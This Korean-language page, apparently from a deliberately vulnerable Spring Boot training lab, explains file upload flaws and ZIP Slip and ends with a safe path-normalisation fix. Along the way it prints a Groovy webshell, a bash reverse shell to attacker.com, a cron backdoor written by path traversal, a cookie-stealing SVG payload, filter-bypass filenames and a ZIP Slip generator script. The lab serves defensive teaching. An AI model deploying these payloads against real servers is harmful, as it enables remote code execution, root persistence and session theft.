파일 업로드 취약점

확장자 검사 없이 파일을 업로드 허용 시, 웹쉘 업로드 및 ZIP Slip을 통한 임의 파일 쓰기가 가능합니다.

OWASP A04: Insecure Design CWE-434 CWE-22 (ZIP Slip)
공격 파일 유형 — Spring Boot 환경 기준
① Groovy 웹쉘 (shell.groovy) — Spring Boot + Groovy 환경
// Groovy webshell - executed by Groovy script engine def cmd = request.getParameter("cmd") def proc = ["bash", "-c", cmd].execute() out.println(proc.text)
→ Spring Boot가 Groovy 스크립트 실행 엔드포인트를 노출하거나, GroovyShell.evaluate() 등을 통해 파일을 실행하는 경우 RCE 가능.
→ Groovy가 classpath에 있고 앱이 업로드된 스크립트를 실행하면 동작.
적용 조건: pom.xml에 groovy 의존성 + 서버가 .groovy 파일을 실행하는 로직 존재
② Linux 쉘 스크립트 (backdoor.sh) — cron / 스크립트 실행 환경
#!/bin/bash # Reverse shell - connect back to attacker bash -i >& /dev/tcp/attacker.com/4444 0>&1
# cron job injection - write to /etc/cron.d/ via path traversal # filename: ../../etc/cron.d/backdoor * * * * * root bash /tmp/backdoor.sh
→ 직접 업로드만으로는 실행 불가. Path Traversal과 결합하여 /etc/cron.d/에 파일을 쓰거나, 서버가 업로드된 .sh를 실행하는 로직이 있을 때 유효.
공격 체인 예시: 파일 업로드(취약) + 경로 순회 → /etc/cron.d/backdoor에 쉘 스크립트 작성 → 1분 후 cron이 root 권한으로 실행
③ SVG / HTML — 브라우저 XSS (서버 실행 없이 쿠키 탈취)
<!-- payload.svg --> <svg xmlns="http://www.w3.org/2000/svg"> <script> new Image().src='/demo/steal?c='+document.cookie; alert('SVG XSS: ' + document.cookie); </script> </svg>
→ 업로드된 SVG를 브라우저로 직접 열면 스크립트 실행. 서버 실행 불필요.
④ 확장자 필터 우회 기법
  • 이중 확장자: shell.jpg.groovy
  • 대소문자: shell.SH / shell.Sh
  • null 바이트 (구형 서버): shell.sh%00.jpg
  • Content-Type 위조: image/jpeg로 전송하면서 실제 내용은 스크립트
기본 파일 업로드 (확장자 검사)
[취약] 검증 없는 업로드

  • 원본 파일명 그대로 저장 → 경로 예측 가능
  • 파일 내용 검사 없음

ZIP Slip — Java 환경 고유 취약점 (CWE-22)

    

        ZIP 내 파일 경로에 ../를 포함시키면, 압축 해제 시 서버의 임의 경로에 파일을 덮어쓸 수 있습니다.
        화이트리스트로 .zip을 허용해도 이 공격은 여전히 가능합니다.
    


    

        악성 ZIP 생성 방법 (Python):
        

            
            
import zipfile

# Creates zip with path traversal entry
zf = zipfile.ZipFile('zipslip.zip', 'w')
zf.writestr('../../uploads/pwned.txt', 'ZIP Slip success! File written outside extract dir.')
zf.writestr('normal.txt', 'This is a normal file.')
zf.close()
print("Created zipslip.zip")

        

        → 위 스크립트로 zipslip.zip 생성 후 아래 취약 업로드에 올려보세요.

[안전] normalize + startsWith 검증

                

                

                    방어 원리:

                    1. normalize()로 ../ 제거

                    2. startsWith(extractDir)로 탈출 감지

                    3. 탈출 시도 엔트리는 건너뜀
                

                

                    

                        
                    

                    
                


                

                    

                        

                        

                            허용된 파일:

                    실제 코드 (FileService.java):
                    

                        
                        
// SAFE: normalize and verify stays within extractDir
Path dest = extractDir.resolve(entry.getName()).normalize();
if (!dest.startsWith(extractDir)) {
    // BLOCK - path traversal detected
    continue;
}
Files.copy(zis, dest, REPLACE_EXISTING);
